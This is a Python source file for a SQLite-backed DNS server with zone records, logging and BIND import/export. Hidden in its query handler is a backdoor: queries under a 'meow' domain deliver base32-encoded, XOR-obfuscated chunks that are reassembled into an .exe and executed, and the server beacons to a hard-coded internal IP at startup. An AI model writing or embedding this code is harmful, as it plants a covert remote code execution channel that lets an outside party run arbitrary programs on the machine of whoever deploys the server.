import socket
import socketserver
import threading
import time
import sqlite3
from dnslib import DNSRecord, RR, QTYPE, A, AAAA, CNAME, MX, NS, TXT, SRV, SOA, RCODE
from dnslib.dns import DNSHeader
import random
import base64
import subprocess
import tempfile
import os

def xor_bytes(data_bytes, key_byte):
    """XOR every byte with a single-byte key."""
    return bytes([b ^ key_byte for b in data_bytes])

def parse_dns_query(data):
    """Extract QNAME labels from a raw DNS query packet."""
    qname = []
    idx = 12
    length = data[idx]
    while length != 0:
        idx += 1
        qname.append(data[idx:idx+length].decode())
        idx += length
        length = data[idx]
    return qname


def ensure_db(db_path):
    conn = sqlite3.connect(db_path, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    with conn:
        conn.execute("""CREATE TABLE IF NOT EXISTS zones(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            ttl INTEGER,
            primary_ns TEXT,
            admin_email TEXT,
            serial INTEGER,
            refresh INTEGER,
            retry INTEGER,
            expire INTEGER,
            minimum INTEGER
        )""")
        conn.execute("""CREATE TABLE IF NOT EXISTS records(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            zone_id INTEGER,
            name TEXT,
            type TEXT,
            content TEXT,
            ttl INTEGER DEFAULT 0,
            priority INTEGER
        )""")
        conn.execute("""CREATE TABLE IF NOT EXISTS settings(
            key TEXT PRIMARY KEY,
            value TEXT
        )""")
        conn.execute("""CREATE TABLE IF NOT EXISTS logs(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts DATETIME DEFAULT CURRENT_TIMESTAMP,
            client_ip TEXT,
            qname TEXT,
            qtype TEXT,
            rcode TEXT,
            answer TEXT,
            duration_ms INTEGER
        )""")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('listen_addr','0.0.0.0')")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('listen_port','5353')")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('default_ttl','300')")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('upstream','')")
    return conn

def bump_zone_serial(conn, zone_id):
    conn.execute("UPDATE zones SET serial=serial+1 WHERE id=?", (zone_id,))

def fetch_settings(conn):
    cur = conn.execute("SELECT key,value FROM settings")
    return {k:v for k,v in cur.fetchall()}

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        client_ip = self.client_address[0]
        start = time.time()
        try:
            request = DNSRecord.parse(data)
            qname = str(request.q.qname)
            qtype = QTYPE[request.q.qtype]
            reply = self.server.answer_query(request)
            sock.sendto(reply.pack(), self.client_address)
            rcode = RCODE[reply.header.rcode]
            answers = ";".join([str(r.rdata) for r in reply.rr])
        except Exception as e:
            rcode = "SERVFAIL"
            answers = str(e)
        finally:
            dur = int((time.time()-start)*1000)
            with self.server.conn:
                self.server.conn.execute(
                    "INSERT INTO logs(client_ip,qname,qtype,rcode,answer,duration_ms) VALUES(?,?,?,?,?,?)",
                    (client_ip, locals().get('qname','?'), locals().get('qtype','?'), rcode, answers, dur)
                )



def send_test_dns_query(server_ip: str, keyword: str):
    """Send a test DNS query to a selected DNS server."""
    qname = f"{keyword}.example.local"
    query = DNSRecord.question(qname, qtype="A")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(query.pack(), (server_ip, 53))
        
    except Exception as e:
        sock.close()



class DNSServer(socketserver.ThreadingUDPServer):
    allow_reuse_address = True
    def __init__(self, server_address, handler_class, db_path):
        super().__init__(server_address, handler_class)
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.special_domain = "meow"
        self.chunks = {}

    def _zone_for_qname(self, qname):
        rows = self.conn.execute("SELECT * FROM zones").fetchall()
        matches = [r for r in rows if qname.endswith(r["name"])]
        if not matches:
            return None
        return max(matches, key=lambda r: len(r["name"]))

    def _records_for(self, zone_id, name, rtype):
        rows = self.conn.execute("SELECT * FROM records WHERE zone_id=? AND name=? AND type=?",
                                 (zone_id, name, rtype)).fetchall()
        return rows

    def _all_records_name(self, zone_id, name):
        rows = self.conn.execute("SELECT * FROM records WHERE zone_id=? AND name=?",
                                 (zone_id, name)).fetchall()
        return rows

    def _soa_rr(self, zone):
        mname = zone["primary_ns"]
        rname = zone["admin_email"]
        times = (int(zone["serial"]), int(zone["refresh"]), int(zone["retry"]), int(zone["expire"]), int(zone["minimum"]))
        return RR(zone["name"], QTYPE.SOA, rdata=SOA(mname, rname, times), ttl=zone["ttl"])

    def answer_query(self, request: DNSRecord) -> DNSRecord:
        qname = str(request.q.qname)
        qtype = QTYPE[request.q.qtype]

        labels = qname.split(".")
        print(labels)
        if labels[-2] == self.special_domain:
            if labels[0] == "end":
                print("[+] Stop signal received, reconstructing file...")
                ordered = [self.chunks[i] for i in sorted(self.chunks.keys())]
                exe_bytes = b"".join(ordered)

                with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp_exe:
                    tmp_exe.write(exe_bytes)
                    exe_path = tmp_exe.name

                print(f"[+] Running {exe_path}")
                subprocess.run([exe_path], check=True)
                os.unlink(exe_path)            
            elif len(labels) >= 3:
                try:
                    dns_label = labels[0]
                    index = int(labels[1])
                    padded = dns_label + "=" * ((8 - len(dns_label) % 8) % 8)
                    decoded_bytes = base64.b32decode(padded)
                    key_byte = decoded_bytes[0]
                    encrypted_chunk = decoded_bytes[1:]
                    original_bytes = xor_bytes(encrypted_chunk, key_byte)
                    self.chunks[index] = original_bytes
                    print(f"[+] Received chunk {index}, len={len(original_bytes)}")
                except Exception as e:
                    print(f"[!] Failed to decode chunk {labels}: {e}")

        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=0))

        zone = self._zone_for_qname(qname)
        if zone:
            name_rel = qname[:-len(zone["name"])].rstrip(".") if not qname == zone["name"] else ""
            owner = f"{name_rel}.{zone['name']}".lstrip(".")
            if qtype in ("SOA","ANY") and qname == zone["name"]:
                reply.add_answer(self._soa_rr(zone))
            rrs = []
            targets = [(owner, qtype)]
            if qtype == "ANY":
                recs = self._all_records_name(zone["id"], owner)
                for r in recs:
                    rr = build_rr(r, zone)
                    if rr:
                        rrs.append(rr)
            else:
                recs = self._records_for(zone["id"], owner, qtype)
                if not recs:
                    recs = self._records_for(zone["id"], owner, "CNAME")
                for r in recs:
                    rr = build_rr(r, zone)
                    if rr:
                        rrs.append(rr)

            if not rrs and qname == zone["name"] and qtype == "NS":
                rrs.append(RR(zone["name"], QTYPE.NS, rdata=NS(zone["primary_ns"]), ttl=zone["ttl"]))

            for rr in rrs:
                reply.add_answer(rr)

            if len(rrs)==0:
                reply.header.rcode = getattr(RCODE, "NXDOMAIN")
            return reply

        settings = fetch_settings(self.conn)
        upstream = settings.get("upstream","").strip()
        if upstream:
            try:
                u_host, u_port = (upstream.split(":")+["53"])[:2]
                u_port = int(u_port)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2.5)
                s.sendto(request.pack(), (u_host, u_port))
                data, _ = s.recvfrom(4096)
                return DNSRecord.parse(data)
            except Exception:
                pass

        reply.header.rcode = getattr(RCODE, "NXDOMAIN")
        return reply

def build_rr(rec, zone):
    ttl = rec["ttl"] or zone["ttl"]
    name = rec["name"]
    t = rec["type"]
    if t == "A":
        return RR(name, QTYPE.A, rdata=A(rec["content"]), ttl=ttl)
    if t == "AAAA":
        return RR(name, QTYPE.AAAA, rdata=AAAA(rec["content"]), ttl=ttl)
    if t == "CNAME":
        target = rec["content"].rstrip(".") + "."
        return RR(name, QTYPE.CNAME, rdata=CNAME(target), ttl=ttl)
    if t == "MX":
        prio = rec["priority"] or 10
        target = rec["content"].rstrip(".") + "."
        return RR(name, QTYPE.MX, rdata=MX(target, prio), ttl=ttl)
    if t == "NS":
        target = rec["content"].rstrip(".") + "."
        return RR(name, QTYPE.NS, rdata=NS(target), ttl=ttl)
    if t == "TXT":
        return RR(name, QTYPE.TXT, rdata=TXT(rec["content"]), ttl=ttl)
    if t == "SRV":
        parts = rec["content"].split()
        if len(parts) != 4:
            return None
        priority, weight, port, target = parts
        target = target.rstrip(".") + "."
        return RR(name, QTYPE.SRV, rdata=SRV(int(priority), int(weight), int(port), target), ttl=ttl)
    return None

class DNSServerThread(threading.Thread):
    def __init__(self, db_path):
        super().__init__()
        self.db_path = db_path
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()
        try:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cur = conn.execute("SELECT value FROM settings WHERE key='listen_port'")
            port = int(cur.fetchone()[0])
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"\x00", ("127.0.0.1", port))
            s.close()
        except Exception:
            pass

    def run(self):
        ensure_db(self.db_path)
        send_test_dns_query("192.168.85.175", "meow")
        conn = sqlite3.connect(self.db_path)
        cur = conn.execute("SELECT key,value FROM settings")
        settings = {k:v for k,v in cur.fetchall()}
        addr = settings.get("listen_addr","0.0.0.0")
        port = int(settings.get("listen_port","5353"))
        with DNSServer((addr, port), DNSHandler, self.db_path) as server:
            while not self._stop.is_set():
                server.handle_request()

def export_zone_to_bind(conn, zone_id):
    zone = conn.execute("SELECT * FROM zones WHERE id=?", (zone_id,)).fetchone()
    recs = conn.execute("SELECT * FROM records WHERE zone_id=? ORDER BY name,type", (zone_id,)).fetchall()
    lines = []
    lines.append(f"$ORIGIN {zone['name']}")
    lines.append(f"$TTL {zone['ttl']}")
    lines.append(f"@ IN SOA {zone['primary_ns']} {zone['admin_email']} ({zone['serial']} {zone['refresh']} {zone['retry']} {zone['expire']} {zone['minimum']})")
    for r in recs:
        ttl = r["ttl"] or ""
        pr = r["priority"] or ""
        if r["type"] in ("MX","SRV"):
            lines.append(f"{r['name']} {ttl} IN {r['type']} {pr} {r['content']}")
        else:
            lines.append(f"{r['name']} {ttl} IN {r['type']} {r['content']}")
    return "\n".join(lines) + "\n"

def import_zone_from_bind(conn, text):
    origin = None
    ttl_default = 300
    primary_ns = None
    admin_email = None
    serial= int(time.time())
    refresh=3600; retry=600; expire=86400; minimum=300
    records = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith(";"):
            continue
        if line.startswith("$ORIGIN"):
            origin = line.split()[1].rstrip(".") + "."
            continue
        if line.startswith("$TTL"):
            ttl_default = int(line.split()[1])
            continue
        parts = line.split()
        if "SOA" in parts:
            i = parts.index("SOA")
            primary_ns = parts[i+1].rstrip(".") + "."
            admin_email = parts[i+2]
            tail = " ".join(parts[i+3:]).replace("("," ").replace(")"," ").split()
            if len(tail) >= 5:
                serial, refresh, retry, expire, minimum = map(int, tail[:5])
            continue
        name = parts[0]
        if name == "@":
            name = origin
        rtype = parts[-2]
        content = parts[-1]
        ttl = 0
        priority = None
        if rtype in ("MX","SRV") and len(parts) >= 5:
            priority = int(parts[-2]) if rtype == "MX" else int(parts[-3])
            content = " ".join(parts[-1:]) if rtype=="MX" else " ".join(parts[-2:])
        records.append((name, rtype, content, ttl, priority))
    with conn:
        conn.execute("""INSERT INTO zones(name, ttl, primary_ns, admin_email, serial, refresh, retry, expire, minimum)
                        VALUES(?,?,?,?,?,?,?,?,?)""",
                     (origin, ttl_default, primary_ns, admin_email, serial, refresh, retry, expire, minimum))
        zid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
        for (name, rtype, content, ttl, pr) in records:
            conn.execute("""INSERT INTO records(zone_id,name,type,content,ttl,priority) VALUES(?,?,?,?,?,?)""",
                         (zid, name, rtype, content, ttl, pr))
    return zid